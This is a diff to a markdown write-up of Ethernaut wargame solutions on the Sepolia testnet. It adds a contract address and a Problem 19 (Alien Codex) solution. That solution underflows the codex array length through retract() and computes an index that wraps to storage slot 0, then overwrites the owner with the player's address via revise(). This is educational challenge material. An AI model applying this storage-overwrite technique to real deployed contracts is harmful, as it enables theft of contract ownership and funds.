@@ -226,6 +226,8 @@ In etherscan, when viewing a txHash, looking over **State**, you can see which s
 
 - MagicNum contract: [0x0465E8AaF6E1fbcC756E7dbAD8eD8E1509409068](https://eth-sepolia.blockscout.com/address/0x0465E8AaF6E1fbcC756E7dbAD8eD8E1509409068)
 
+- Deployed contract: [0xfcFa5d641285952B4f71564c5BC4952b370B7594](https://eth-sepolia.blockscout.com/address/0xfcFa5d641285952B4f71564c5BC4952b370B7594)
+
 Ref:
 - AI ans: https://www.perplexity.ai/search/the-ethernaut-G1EIbK15TA.3qnWN4q53sA#29
 - How to deploy raw bytecode to the EVM: https://ardislu.dev/raw-bytecode-evm
@@ -266,3 +268,28 @@ Ref:
   // Find the deployed contract address from the returned txHash
   await contract.setSolver("0xfcFa5d641285952B4f71564c5BC4952b370B7594");
   ```
+
+## Problem 19: Alien Codex
+
+- AlienCodex contract: [0x3F223FD13b35731eD43D8C38548aBdd2e0B3eCae](https://eth-sepolia.blockscout.com/address/0x3F223FD13b35731eD43D8C38548aBdd2e0B3eCae)
+
+**Solution**
+
+- The insight is the storage layout is
+   ```sol
+   address private owner   // 20-byte storage slot 0
+   bool public contact     // 1-byte storage slot 0
+   bytes32[] public codex  // its len is 32-byte storage slot 1
+   ```
+
+   The content of the first element of codex is stored at `keccak256("0x0000000000000000000000000000000000000000000000000000000000000001")`, which is **0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6**.
+
+- Call retract(), so its codex length underflow and become 0xffff.., allow accessing all storage.
+   ```ts
+   await contract.retract()
+   ```
+
+- We calculate from the content location `0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6`, if we access codex **35707666377435648211887908874984608119992236509074197713628505308453184860938**th element (by `0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff` - `0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6` + 1), we are writing back to storage slot 0x0000000000000000000000000000000000000000000000000000000000000000.
+   ```ts
+   await contract.revise('35707666377435648211887908874984608119992236509074197713628505308453184860938', "0x000000000000000000000000B0fD5a878DBF3F9358A251caF9b6Fc692A999cA7");
+   ```
